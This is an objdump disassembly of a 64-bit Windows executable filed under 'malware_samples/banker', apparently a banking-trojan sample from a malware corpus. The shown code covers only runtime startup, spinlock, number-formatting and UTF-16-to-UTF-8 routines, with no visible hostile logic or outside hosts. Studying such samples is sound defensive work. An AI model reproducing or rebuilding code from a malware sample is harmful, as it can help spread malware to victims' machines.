
malware_samples/banker/2216e13de2ed490004e99ba074159c38959c4e93e145201b99408a0a8eeb391c.exe:     file format pei-x86-64


Disassembly of section .text:

000000006d8c1000 <.text>:
    6d8c1000:	48 8d 0d f9 af 0f 00 	lea    0xfaff9(%rip),%rcx        # 0x6d9bc000
    6d8c1007:	e9 c4 d5 00 00       	jmp    0x6d8ce5d0
    6d8c100c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8c1010:	41 55                	push   %r13
    6d8c1012:	41 54                	push   %r12
    6d8c1014:	55                   	push   %rbp
    6d8c1015:	57                   	push   %rdi
    6d8c1016:	56                   	push   %rsi
    6d8c1017:	53                   	push   %rbx
    6d8c1018:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c101c:	85 d2                	test   %edx,%edx
    6d8c101e:	49 89 cc             	mov    %rcx,%r12
    6d8c1021:	4d 89 c5             	mov    %r8,%r13
    6d8c1024:	75 7a                	jne    0x6d8c10a0
    6d8c1026:	8b 15 ec af 0f 00    	mov    0xfafec(%rip),%edx        # 0x6d9bc018
    6d8c102c:	31 c0                	xor    %eax,%eax
    6d8c102e:	85 d2                	test   %edx,%edx
    6d8c1030:	7e 59                	jle    0x6d8c108b
    6d8c1032:	83 ea 01             	sub    $0x1,%edx
    6d8c1035:	48 8b 1d f4 77 0f 00 	mov    0xf77f4(%rip),%rbx        # 0x6d9b8830
    6d8c103c:	31 ed                	xor    %ebp,%ebp
    6d8c103e:	bf 01 00 00 00       	mov    $0x1,%edi
    6d8c1043:	89 15 cf af 0f 00    	mov    %edx,0xfafcf(%rip)        # 0x6d9bc018
    6d8c1049:	4c 8b 25 2c 02 11 00 	mov    0x11022c(%rip),%r12        # 0x6d9d127c
    6d8c1050:	eb 08                	jmp    0x6d8c105a
    6d8c1052:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    6d8c1057:	41 ff d4             	call   *%r12
    6d8c105a:	48 89 e8             	mov    %rbp,%rax
    6d8c105d:	f0 48 0f b1 3b       	lock cmpxchg %rdi,(%rbx)
    6d8c1062:	48 85 c0             	test   %rax,%rax
    6d8c1065:	48 89 c6             	mov    %rax,%rsi
    6d8c1068:	75 e8                	jne    0x6d8c1052
    6d8c106a:	48 8b 3d cf 77 0f 00 	mov    0xf77cf(%rip),%rdi        # 0x6d9b8840
    6d8c1071:	8b 07                	mov    (%rdi),%eax
    6d8c1073:	83 f8 02             	cmp    $0x2,%eax
    6d8c1076:	0f 84 e9 00 00 00    	je     0x6d8c1165
    6d8c107c:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    6d8c1081:	e8 3a d5 00 00       	call   0x6d8ce5c0
    6d8c1086:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c108b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c108f:	5b                   	pop    %rbx
    6d8c1090:	5e                   	pop    %rsi
    6d8c1091:	5f                   	pop    %rdi
    6d8c1092:	5d                   	pop    %rbp
    6d8c1093:	41 5c                	pop    %r12
    6d8c1095:	41 5d                	pop    %r13
    6d8c1097:	c3                   	ret
    6d8c1098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8c109f:	00 
    6d8c10a0:	83 fa 01             	cmp    $0x1,%edx
    6d8c10a3:	0f 85 aa 00 00 00    	jne    0x6d8c1153
    6d8c10a9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
    6d8c10b0:	00 00 
    6d8c10b2:	48 8b 1d 77 77 0f 00 	mov    0xf7777(%rip),%rbx        # 0x6d9b8830
    6d8c10b9:	31 ff                	xor    %edi,%edi
    6d8c10bb:	48 8b 70 08          	mov    0x8(%rax),%rsi
    6d8c10bf:	48 8b 2d b6 01 11 00 	mov    0x1101b6(%rip),%rbp        # 0x6d9d127c
    6d8c10c6:	eb 18                	jmp    0x6d8c10e0
    6d8c10c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8c10cf:	00 
    6d8c10d0:	48 39 c6             	cmp    %rax,%rsi
    6d8c10d3:	0f 84 b7 00 00 00    	je     0x6d8c1190
    6d8c10d9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    6d8c10de:	ff d5                	call   *%rbp
    6d8c10e0:	48 89 f8             	mov    %rdi,%rax
    6d8c10e3:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
    6d8c10e8:	48 85 c0             	test   %rax,%rax
    6d8c10eb:	75 e3                	jne    0x6d8c10d0
    6d8c10ed:	31 ff                	xor    %edi,%edi
    6d8c10ef:	48 8b 35 4a 77 0f 00 	mov    0xf774a(%rip),%rsi        # 0x6d9b8840
    6d8c10f6:	8b 06                	mov    (%rsi),%eax
    6d8c10f8:	83 f8 01             	cmp    $0x1,%eax
    6d8c10fb:	0f 84 ef 00 00 00    	je     0x6d8c11f0
    6d8c1101:	8b 06                	mov    (%rsi),%eax
    6d8c1103:	85 c0                	test   %eax,%eax
    6d8c1105:	0f 84 a5 00 00 00    	je     0x6d8c11b0
    6d8c110b:	8b 06                	mov    (%rsi),%eax
    6d8c110d:	83 f8 01             	cmp    $0x1,%eax
    6d8c1110:	0f 84 ba 00 00 00    	je     0x6d8c11d0
    6d8c1116:	85 ff                	test   %edi,%edi
    6d8c1118:	0f 84 82 00 00 00    	je     0x6d8c11a0
    6d8c111e:	48 8b 05 db 76 0f 00 	mov    0xf76db(%rip),%rax        # 0x6d9b8800
    6d8c1125:	48 8b 00             	mov    (%rax),%rax
    6d8c1128:	48 85 c0             	test   %rax,%rax
    6d8c112b:	74 0d                	je     0x6d8c113a
    6d8c112d:	4d 89 e8             	mov    %r13,%r8
    6d8c1130:	ba 02 00 00 00       	mov    $0x2,%edx
    6d8c1135:	4c 89 e1             	mov    %r12,%rcx
    6d8c1138:	ff d0                	call   *%rax
    6d8c113a:	83 05 d7 ae 0f 00 01 	addl   $0x1,0xfaed7(%rip)        # 0x6d9bc018
    6d8c1141:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c1146:	48 83 c4 28          	add    $0x28,%rsp
    6d8c114a:	5b                   	pop    %rbx
    6d8c114b:	5e                   	pop    %rsi
    6d8c114c:	5f                   	pop    %rdi
    6d8c114d:	5d                   	pop    %rbp
    6d8c114e:	41 5c                	pop    %r12
    6d8c1150:	41 5d                	pop    %r13
    6d8c1152:	c3                   	ret
    6d8c1153:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c1158:	48 83 c4 28          	add    $0x28,%rsp
    6d8c115c:	5b                   	pop    %rbx
    6d8c115d:	5e                   	pop    %rsi
    6d8c115e:	5f                   	pop    %rdi
    6d8c115f:	5d                   	pop    %rbp
    6d8c1160:	41 5c                	pop    %r12
    6d8c1162:	41 5d                	pop    %r13
    6d8c1164:	c3                   	ret
    6d8c1165:	48 8d 0d 94 ae 0f 00 	lea    0xfae94(%rip),%rcx        # 0x6d9bc000
    6d8c116c:	e8 5f d5 00 00       	call   0x6d8ce6d0
    6d8c1171:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
    6d8c1177:	48 87 33             	xchg   %rsi,(%rbx)
    6d8c117a:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c117f:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1183:	5b                   	pop    %rbx
    6d8c1184:	5e                   	pop    %rsi
    6d8c1185:	5f                   	pop    %rdi
    6d8c1186:	5d                   	pop    %rbp
    6d8c1187:	41 5c                	pop    %r12
    6d8c1189:	41 5d                	pop    %r13
    6d8c118b:	c3                   	ret
    6d8c118c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8c1190:	bf 01 00 00 00       	mov    $0x1,%edi
    6d8c1195:	e9 55 ff ff ff       	jmp    0x6d8c10ef
    6d8c119a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8c11a0:	31 c0                	xor    %eax,%eax
    6d8c11a2:	48 87 03             	xchg   %rax,(%rbx)
    6d8c11a5:	e9 74 ff ff ff       	jmp    0x6d8c111e
    6d8c11aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8c11b0:	48 8b 15 c9 76 0f 00 	mov    0xf76c9(%rip),%rdx        # 0x6d9b8880
    6d8c11b7:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
    6d8c11bd:	48 8b 0d ac 76 0f 00 	mov    0xf76ac(%rip),%rcx        # 0x6d9b8870
    6d8c11c4:	e8 e7 d3 00 00       	call   0x6d8ce5b0
    6d8c11c9:	e9 3d ff ff ff       	jmp    0x6d8c110b
    6d8c11ce:	66 90                	xchg   %ax,%ax
    6d8c11d0:	48 8b 15 89 76 0f 00 	mov    0xf7689(%rip),%rdx        # 0x6d9b8860
    6d8c11d7:	48 8b 0d 72 76 0f 00 	mov    0xf7672(%rip),%rcx        # 0x6d9b8850
    6d8c11de:	e8 cd d3 00 00       	call   0x6d8ce5b0
    6d8c11e3:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
    6d8c11e9:	e9 28 ff ff ff       	jmp    0x6d8c1116
    6d8c11ee:	66 90                	xchg   %ax,%ax
    6d8c11f0:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    6d8c11f5:	e8 c6 d3 00 00       	call   0x6d8ce5c0
    6d8c11fa:	e9 0c ff ff ff       	jmp    0x6d8c110b
    6d8c11ff:	90                   	nop
    6d8c1200:	41 54                	push   %r12
    6d8c1202:	55                   	push   %rbp
    6d8c1203:	57                   	push   %rdi
    6d8c1204:	56                   	push   %rsi
    6d8c1205:	53                   	push   %rbx
    6d8c1206:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c120a:	48 8b 35 0f 76 0f 00 	mov    0xf760f(%rip),%rsi        # 0x6d9b8820
    6d8c1211:	85 d2                	test   %edx,%edx
    6d8c1213:	48 89 cf             	mov    %rcx,%rdi
    6d8c1216:	89 d3                	mov    %edx,%ebx
    6d8c1218:	89 16                	mov    %edx,(%rsi)
    6d8c121a:	4c 89 c5             	mov    %r8,%rbp
    6d8c121d:	75 54                	jne    0x6d8c1273
    6d8c121f:	8b 05 f3 ad 0f 00    	mov    0xfadf3(%rip),%eax        # 0x6d9bc018
    6d8c1225:	85 c0                	test   %eax,%eax
    6d8c1227:	74 33                	je     0x6d8c125c
    6d8c1229:	e8 f2 c4 00 00       	call   0x6d8cd720
    6d8c122e:	49 89 e8             	mov    %rbp,%r8
    6d8c1231:	31 d2                	xor    %edx,%edx
    6d8c1233:	48 89 f9             	mov    %rdi,%rcx
    6d8c1236:	e8 5f bf 00 00       	call   0x6d8cd19a
    6d8c123b:	49 89 e8             	mov    %rbp,%r8
    6d8c123e:	89 da                	mov    %ebx,%edx
    6d8c1240:	48 89 f9             	mov    %rdi,%rcx
    6d8c1243:	e8 b8 d2 00 00       	call   0x6d8ce500
    6d8c1248:	49 89 e8             	mov    %rbp,%r8
    6d8c124b:	89 da                	mov    %ebx,%edx
    6d8c124d:	48 89 f9             	mov    %rdi,%rcx
    6d8c1250:	41 89 c4             	mov    %eax,%r12d
    6d8c1253:	e8 b8 fd ff ff       	call   0x6d8c1010
    6d8c1258:	85 c0                	test   %eax,%eax
    6d8c125a:	75 03                	jne    0x6d8c125f
    6d8c125c:	45 31 e4             	xor    %r12d,%r12d
    6d8c125f:	44 89 e0             	mov    %r12d,%eax
    6d8c1262:	c7 06 ff ff ff ff    	movl   $0xffffffff,(%rsi)
    6d8c1268:	48 83 c4 20          	add    $0x20,%rsp
    6d8c126c:	5b                   	pop    %rbx
    6d8c126d:	5e                   	pop    %rsi
    6d8c126e:	5f                   	pop    %rdi
    6d8c126f:	5d                   	pop    %rbp
    6d8c1270:	41 5c                	pop    %r12
    6d8c1272:	c3                   	ret
    6d8c1273:	e8 a8 c4 00 00       	call   0x6d8cd720
    6d8c1278:	8d 43 ff             	lea    -0x1(%rbx),%eax
    6d8c127b:	83 f8 01             	cmp    $0x1,%eax
    6d8c127e:	76 20                	jbe    0x6d8c12a0
    6d8c1280:	49 89 e8             	mov    %rbp,%r8
    6d8c1283:	89 da                	mov    %ebx,%edx
    6d8c1285:	48 89 f9             	mov    %rdi,%rcx
    6d8c1288:	e8 0d bf 00 00       	call   0x6d8cd19a
    6d8c128d:	83 fb 03             	cmp    $0x3,%ebx
    6d8c1290:	41 89 c4             	mov    %eax,%r12d
    6d8c1293:	75 ca                	jne    0x6d8c125f
    6d8c1295:	eb a4                	jmp    0x6d8c123b
    6d8c1297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6d8c129e:	00 00 
    6d8c12a0:	49 89 e8             	mov    %rbp,%r8
    6d8c12a3:	89 da                	mov    %ebx,%edx
    6d8c12a5:	48 89 f9             	mov    %rdi,%rcx
    6d8c12a8:	e8 63 fd ff ff       	call   0x6d8c1010
    6d8c12ad:	85 c0                	test   %eax,%eax
    6d8c12af:	74 ab                	je     0x6d8c125c
    6d8c12b1:	49 89 e8             	mov    %rbp,%r8
    6d8c12b4:	89 da                	mov    %ebx,%edx
    6d8c12b6:	48 89 f9             	mov    %rdi,%rcx
    6d8c12b9:	e8 42 d2 00 00       	call   0x6d8ce500
    6d8c12be:	85 c0                	test   %eax,%eax
    6d8c12c0:	41 89 c4             	mov    %eax,%r12d
    6d8c12c3:	74 5b                	je     0x6d8c1320
    6d8c12c5:	83 fb 01             	cmp    $0x1,%ebx
    6d8c12c8:	75 b6                	jne    0x6d8c1280
    6d8c12ca:	e8 a1 bf 00 00       	call   0x6d8cd270
    6d8c12cf:	49 89 e8             	mov    %rbp,%r8
    6d8c12d2:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c12d7:	48 89 f9             	mov    %rdi,%rcx
    6d8c12da:	e8 bb be 00 00       	call   0x6d8cd19a
    6d8c12df:	85 c0                	test   %eax,%eax
    6d8c12e1:	41 89 c4             	mov    %eax,%r12d
    6d8c12e4:	0f 85 75 ff ff ff    	jne    0x6d8c125f
    6d8c12ea:	49 89 e8             	mov    %rbp,%r8
    6d8c12ed:	31 d2                	xor    %edx,%edx
    6d8c12ef:	48 89 f9             	mov    %rdi,%rcx
    6d8c12f2:	e8 a3 be 00 00       	call   0x6d8cd19a
    6d8c12f7:	49 89 e8             	mov    %rbp,%r8
    6d8c12fa:	31 d2                	xor    %edx,%edx
    6d8c12fc:	48 89 f9             	mov    %rdi,%rcx
    6d8c12ff:	e8 fc d1 00 00       	call   0x6d8ce500
    6d8c1304:	49 89 e8             	mov    %rbp,%r8
    6d8c1307:	31 d2                	xor    %edx,%edx
    6d8c1309:	48 89 f9             	mov    %rdi,%rcx
    6d8c130c:	e8 ff fc ff ff       	call   0x6d8c1010
    6d8c1311:	e9 49 ff ff ff       	jmp    0x6d8c125f
    6d8c1316:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8c131d:	00 00 00 
    6d8c1320:	83 fb 01             	cmp    $0x1,%ebx
    6d8c1323:	0f 85 33 ff ff ff    	jne    0x6d8c125c
    6d8c1329:	eb d9                	jmp    0x6d8c1304
    6d8c132b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8c1330:	48 83 ec 48          	sub    $0x48,%rsp
    6d8c1334:	48 8b 05 65 75 0f 00 	mov    0xf7565(%rip),%rax        # 0x6d9b88a0
    6d8c133b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    6d8c1341:	83 fa 01             	cmp    $0x1,%edx
    6d8c1344:	74 0a                	je     0x6d8c1350
    6d8c1346:	48 83 c4 48          	add    $0x48,%rsp
    6d8c134a:	e9 b1 fe ff ff       	jmp    0x6d8c1200
    6d8c134f:	90                   	nop
    6d8c1350:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
    6d8c1355:	89 54 24 34          	mov    %edx,0x34(%rsp)
    6d8c1359:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
    6d8c135e:	e8 2d bf 00 00       	call   0x6d8cd290
    6d8c1363:	e8 18 c8 00 00       	call   0x6d8cdb80
    6d8c1368:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
    6d8c136d:	8b 54 24 34          	mov    0x34(%rsp),%edx
    6d8c1371:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c1376:	48 83 c4 48          	add    $0x48,%rsp
    6d8c137a:	e9 81 fe ff ff       	jmp    0x6d8c1200
    6d8c137f:	90                   	nop
    6d8c1380:	48 89 ca             	mov    %rcx,%rdx
    6d8c1383:	48 8d 0d 76 ac 0f 00 	lea    0xfac76(%rip),%rcx        # 0x6d9bc000
    6d8c138a:	e9 71 d2 00 00       	jmp    0x6d8ce600
    6d8c138f:	90                   	nop
    6d8c1390:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x6d8c13a0
    6d8c1397:	e9 e4 ff ff ff       	jmp    0x6d8c1380
    6d8c139c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8c13a0:	c3                   	ret
    6d8c13a1:	90                   	nop
    6d8c13a2:	90                   	nop
    6d8c13a3:	90                   	nop
    6d8c13a4:	90                   	nop
    6d8c13a5:	90                   	nop
    6d8c13a6:	90                   	nop
    6d8c13a7:	90                   	nop
    6d8c13a8:	90                   	nop
    6d8c13a9:	90                   	nop
    6d8c13aa:	90                   	nop
    6d8c13ab:	90                   	nop
    6d8c13ac:	90                   	nop
    6d8c13ad:	90                   	nop
    6d8c13ae:	90                   	nop
    6d8c13af:	90                   	nop
    6d8c13b0:	55                   	push   %rbp
    6d8c13b1:	57                   	push   %rdi
    6d8c13b2:	56                   	push   %rsi
    6d8c13b3:	53                   	push   %rbx
    6d8c13b4:	48 83 ec 48          	sub    $0x48,%rsp
    6d8c13b8:	bb 17 00 00 00       	mov    $0x17,%ebx
    6d8c13bd:	41 b8 64 00 00 00    	mov    $0x64,%r8d
    6d8c13c3:	4c 8d 4c 24 27       	lea    0x27(%rsp),%r9
    6d8c13c8:	48 89 ce             	mov    %rcx,%rsi
    6d8c13cb:	48 89 d0             	mov    %rdx,%rax
    6d8c13ce:	48 8d 0d 2b 0c 01 00 	lea    0x10c2b(%rip),%rcx        # 0x6d8d2000
    6d8c13d5:	48 83 f8 63          	cmp    $0x63,%rax
    6d8c13d9:	77 20                	ja     0x6d8c13fb
    6d8c13db:	48 83 f8 09          	cmp    $0x9,%rax
    6d8c13df:	76 39                	jbe    0x6d8c141a
    6d8c13e1:	48 8d 15 18 0c 01 00 	lea    0x10c18(%rip),%rdx        # 0x6d8d2000
    6d8c13e8:	48 01 c0             	add    %rax,%rax
    6d8c13eb:	8a 4c 02 01          	mov    0x1(%rdx,%rax,1),%cl
    6d8c13ef:	8a 04 02             	mov    (%rdx,%rax,1),%al
    6d8c13f2:	88 4c 1c 28          	mov    %cl,0x28(%rsp,%rbx,1)
    6d8c13f6:	48 ff cb             	dec    %rbx
    6d8c13f9:	eb 22                	jmp    0x6d8c141d
    6d8c13fb:	31 d2                	xor    %edx,%edx
    6d8c13fd:	49 f7 f0             	div    %r8
    6d8c1400:	48 01 d2             	add    %rdx,%rdx
    6d8c1403:	44 8a 54 11 01       	mov    0x1(%rcx,%rdx,1),%r10b
    6d8c1408:	8a 14 11             	mov    (%rcx,%rdx,1),%dl
    6d8c140b:	44 88 54 1c 28       	mov    %r10b,0x28(%rsp,%rbx,1)
    6d8c1410:	41 88 14 19          	mov    %dl,(%r9,%rbx,1)
    6d8c1414:	48 83 eb 02          	sub    $0x2,%rbx
    6d8c1418:	eb bb                	jmp    0x6d8c13d5
    6d8c141a:	83 c0 30             	add    $0x30,%eax
    6d8c141d:	b9 18 00 00 00       	mov    $0x18,%ecx
    6d8c1422:	31 ed                	xor    %ebp,%ebp
    6d8c1424:	88 44 1c 28          	mov    %al,0x28(%rsp,%rbx,1)
    6d8c1428:	48 89 cf             	mov    %rcx,%rdi
    6d8c142b:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c142e:	48 29 df             	sub    %rbx,%rdi
    6d8c1431:	48 85 c9             	test   %rcx,%rcx
    6d8c1434:	74 03                	je     0x6d8c1439
    6d8c1436:	48 8b 29             	mov    (%rcx),%rbp
    6d8c1439:	48 8d 14 2f          	lea    (%rdi,%rbp,1),%rdx
    6d8c143d:	e8 fa 2c 00 00       	call   0x6d8c413c
    6d8c1442:	48 89 f1             	mov    %rsi,%rcx
    6d8c1445:	48 89 c2             	mov    %rax,%rdx
    6d8c1448:	e8 63 2c 00 00       	call   0x6d8c40b0
    6d8c144d:	48 8b 06             	mov    (%rsi),%rax
    6d8c1450:	48 8d 74 1c 28       	lea    0x28(%rsp,%rbx,1),%rsi
    6d8c1455:	89 f9                	mov    %edi,%ecx
    6d8c1457:	48 8d 44 28 10       	lea    0x10(%rax,%rbp,1),%rax
    6d8c145c:	48 89 c7             	mov    %rax,%rdi
    6d8c145f:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c1461:	48 83 c4 48          	add    $0x48,%rsp
    6d8c1465:	5b                   	pop    %rbx
    6d8c1466:	5e                   	pop    %rsi
    6d8c1467:	5f                   	pop    %rdi
    6d8c1468:	5d                   	pop    %rbp
    6d8c1469:	c3                   	ret
    6d8c146a:	e9 41 ff ff ff       	jmp    0x6d8c13b0
    6d8c146f:	57                   	push   %rdi
    6d8c1470:	56                   	push   %rsi
    6d8c1471:	53                   	push   %rbx
    6d8c1472:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c1476:	48 85 d2             	test   %rdx,%rdx
    6d8c1479:	48 89 cb             	mov    %rcx,%rbx
    6d8c147c:	48 89 d6             	mov    %rdx,%rsi
    6d8c147f:	79 3a                	jns    0x6d8c14bb
    6d8c1481:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c1486:	48 c1 e0 3f          	shl    $0x3f,%rax
    6d8c148a:	48 39 c2             	cmp    %rax,%rdx
    6d8c148d:	74 03                	je     0x6d8c1492
    6d8c148f:	48 f7 de             	neg    %rsi
    6d8c1492:	48 8b 0b             	mov    (%rbx),%rcx
    6d8c1495:	31 ff                	xor    %edi,%edi
    6d8c1497:	48 85 c9             	test   %rcx,%rcx
    6d8c149a:	74 03                	je     0x6d8c149f
    6d8c149c:	48 8b 39             	mov    (%rcx),%rdi
    6d8c149f:	48 8d 57 01          	lea    0x1(%rdi),%rdx
    6d8c14a3:	e8 94 2c 00 00       	call   0x6d8c413c
    6d8c14a8:	48 89 d9             	mov    %rbx,%rcx
    6d8c14ab:	48 89 c2             	mov    %rax,%rdx
    6d8c14ae:	e8 fd 2b 00 00       	call   0x6d8c40b0
    6d8c14b3:	48 8b 03             	mov    (%rbx),%rax
    6d8c14b6:	c6 44 38 10 2d       	movb   $0x2d,0x10(%rax,%rdi,1)
    6d8c14bb:	48 89 f2             	mov    %rsi,%rdx
    6d8c14be:	48 89 d9             	mov    %rbx,%rcx
    6d8c14c1:	48 83 c4 20          	add    $0x20,%rsp
    6d8c14c5:	5b                   	pop    %rbx
    6d8c14c6:	5e                   	pop    %rsi
    6d8c14c7:	5f                   	pop    %rdi
    6d8c14c8:	e9 e3 fe ff ff       	jmp    0x6d8c13b0
    6d8c14cd:	90                   	nop
    6d8c14ce:	90                   	nop
    6d8c14cf:	90                   	nop
    6d8c14d0:	c3                   	ret
    6d8c14d1:	90                   	nop
    6d8c14d2:	90                   	nop
    6d8c14d3:	90                   	nop
    6d8c14d4:	90                   	nop
    6d8c14d5:	90                   	nop
    6d8c14d6:	90                   	nop
    6d8c14d7:	90                   	nop
    6d8c14d8:	90                   	nop
    6d8c14d9:	90                   	nop
    6d8c14da:	90                   	nop
    6d8c14db:	90                   	nop
    6d8c14dc:	90                   	nop
    6d8c14dd:	90                   	nop
    6d8c14de:	90                   	nop
    6d8c14df:	90                   	nop
    6d8c14e0:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c14e4:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6d8c14eb:	00 00 
    6d8c14ed:	48 89 ca             	mov    %rcx,%rdx
    6d8c14f0:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6d8c14f5:	e8 75 ff ff ff       	call   0x6d8c146f
    6d8c14fa:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8c14ff:	48 83 c4 38          	add    $0x38,%rsp
    6d8c1503:	c3                   	ret
    6d8c1504:	90                   	nop
    6d8c1505:	90                   	nop
    6d8c1506:	90                   	nop
    6d8c1507:	90                   	nop
    6d8c1508:	90                   	nop
    6d8c1509:	90                   	nop
    6d8c150a:	90                   	nop
    6d8c150b:	90                   	nop
    6d8c150c:	90                   	nop
    6d8c150d:	90                   	nop
    6d8c150e:	90                   	nop
    6d8c150f:	90                   	nop
    6d8c1510:	c3                   	ret
    6d8c1511:	0f b7 c1             	movzwl %cx,%eax
    6d8c1514:	c3                   	ret
    6d8c1515:	41 55                	push   %r13
    6d8c1517:	41 54                	push   %r12
    6d8c1519:	55                   	push   %rbp
    6d8c151a:	57                   	push   %rdi
    6d8c151b:	56                   	push   %rsi
    6d8c151c:	53                   	push   %rbx
    6d8c151d:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1521:	41 bc ef ff ff ff    	mov    $0xffffffef,%r12d
    6d8c1527:	41 bd bf ff ff ff    	mov    $0xffffffbf,%r13d
    6d8c152d:	48 89 cf             	mov    %rcx,%rdi
    6d8c1530:	48 89 d1             	mov    %rdx,%rcx
    6d8c1533:	4c 89 c5             	mov    %r8,%rbp
    6d8c1536:	48 c1 f9 02          	sar    $0x2,%rcx
    6d8c153a:	48 01 d1             	add    %rdx,%rcx
    6d8c153d:	e8 12 2a 00 00       	call   0x6d8c3f54
    6d8c1542:	45 31 c0             	xor    %r8d,%r8d
    6d8c1545:	4b 8d 14 00          	lea    (%r8,%r8,1),%rdx
    6d8c1549:	66 8b 0c 17          	mov    (%rdi,%rdx,1),%cx
    6d8c154d:	66 85 c9             	test   %cx,%cx
    6d8c1550:	0f 84 35 01 00 00    	je     0x6d8c168b
    6d8c1556:	44 8d 89 00 28 00 00 	lea    0x2800(%rcx),%r9d
    6d8c155d:	49 8d 70 01          	lea    0x1(%r8),%rsi
    6d8c1561:	66 41 81 f9 ff 03    	cmp    $0x3ff,%r9w
    6d8c1567:	77 1e                	ja     0x6d8c1587
    6d8c1569:	44 0f b7 4c 17 02    	movzwl 0x2(%rdi,%rdx,1),%r9d
    6d8c156f:	66 41 81 f9 ff db    	cmp    $0xdbff,%r9w
    6d8c1575:	4c 89 ca             	mov    %r9,%rdx
    6d8c1578:	77 22                	ja     0x6d8c159c
    6d8c157a:	49 81 f9 ff db 00 00 	cmp    $0xdbff,%r9
    6d8c1581:	41 0f 9f c1          	setg   %r9b
    6d8c1585:	eb 20                	jmp    0x6d8c15a7
    6d8c1587:	8d 91 00 24 00 00    	lea    0x2400(%rcx),%edx
    6d8c158d:	48 89 eb             	mov    %rbp,%rbx
    6d8c1590:	66 81 fa ff 03       	cmp    $0x3ff,%dx
    6d8c1595:	76 3e                	jbe    0x6d8c15d5
    6d8c1597:	0f b7 d9             	movzwl %cx,%ebx
    6d8c159a:	eb 39                	jmp    0x6d8c15d5
    6d8c159c:	49 81 f9 ff df 00 00 	cmp    $0xdfff,%r9
    6d8c15a3:	41 0f 9e c1          	setle  %r9b
    6d8c15a7:	45 84 c9             	test   %r9b,%r9b
    6d8c15aa:	74 26                	je     0x6d8c15d2
    6d8c15ac:	49 8d 70 02          	lea    0x2(%r8),%rsi
    6d8c15b0:	48 89 cb             	mov    %rcx,%rbx
    6d8c15b3:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
    6d8c15b9:	48 c1 e3 0a          	shl    $0xa,%rbx
    6d8c15bd:	81 e3 00 fc 0f 00    	and    $0xffc00,%ebx
    6d8c15c3:	48 09 d3             	or     %rdx,%rbx
    6d8c15c6:	48 81 c3 00 00 01 00 	add    $0x10000,%rbx
    6d8c15cd:	e9 95 00 00 00       	jmp    0x6d8c1667
    6d8c15d2:	48 89 eb             	mov    %rbp,%rbx
    6d8c15d5:	48 83 fb 7f          	cmp    $0x7f,%rbx
    6d8c15d9:	7e 79                	jle    0x6d8c1654
    6d8c15db:	48 81 fb ff 07 00 00 	cmp    $0x7ff,%rbx
    6d8c15e2:	7e 0b                	jle    0x6d8c15ef
    6d8c15e4:	48 81 fb ff ff 00 00 	cmp    $0xffff,%rbx
    6d8c15eb:	7f 0e                	jg     0x6d8c15fb
    6d8c15ed:	eb 32                	jmp    0x6d8c1621
    6d8c15ef:	48 89 da             	mov    %rbx,%rdx
    6d8c15f2:	48 c1 fa 06          	sar    $0x6,%rdx
    6d8c15f6:	83 ca c0             	or     $0xffffffc0,%edx
    6d8c15f9:	eb 48                	jmp    0x6d8c1643
    6d8c15fb:	48 81 fb ff ff 10 00 	cmp    $0x10ffff,%rbx
    6d8c1602:	7e 63                	jle    0x6d8c1667
    6d8c1604:	44 89 e2             	mov    %r12d,%edx
    6d8c1607:	48 89 c1             	mov    %rax,%rcx
    6d8c160a:	e8 ee 29 00 00       	call   0x6d8c3ffd
    6d8c160f:	44 89 ea             	mov    %r13d,%edx
    6d8c1612:	48 89 c1             	mov    %rax,%rcx
    6d8c1615:	e8 e3 29 00 00       	call   0x6d8c3ffd
    6d8c161a:	ba bd ff ff ff       	mov    $0xffffffbd,%edx
    6d8c161f:	eb 36                	jmp    0x6d8c1657
    6d8c1621:	48 89 da             	mov    %rbx,%rdx
    6d8c1624:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c1628:	83 ca e0             	or     $0xffffffe0,%edx
    6d8c162b:	0f be d2             	movsbl %dl,%edx
    6d8c162e:	48 89 c1             	mov    %rax,%rcx
    6d8c1631:	e8 c7 29 00 00       	call   0x6d8c3ffd
    6d8c1636:	48 89 da             	mov    %rbx,%rdx
